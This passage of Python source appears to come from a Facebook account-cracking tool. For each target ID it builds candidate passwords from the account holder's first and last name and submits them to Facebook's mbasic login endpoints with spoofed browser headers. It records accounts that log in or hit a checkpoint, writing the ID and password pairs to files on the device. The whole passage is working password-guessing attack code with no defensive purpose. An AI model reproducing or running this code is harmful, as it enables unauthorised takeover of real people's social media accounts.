                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Fof=session.cookies.get_dict().keys()
                        if "c_user" in Fof:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [MASK\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/FOF•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [FOF•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/FOF•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1

def m4(ids,names,passlist):
        global loop,oks,cps
        ua = random.choice(ugen) 
        sys.stdout.write(f'\r\r\033[1;37m [MASK] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        head = {'Host': 'x.facebook.com', 'viewport-width': '980',  'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Fof=session.cookies.get_dict().keys()
                        if "c_user" in Fof:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [FOF\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/FOF•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [FOF•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/FOF•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
menu()
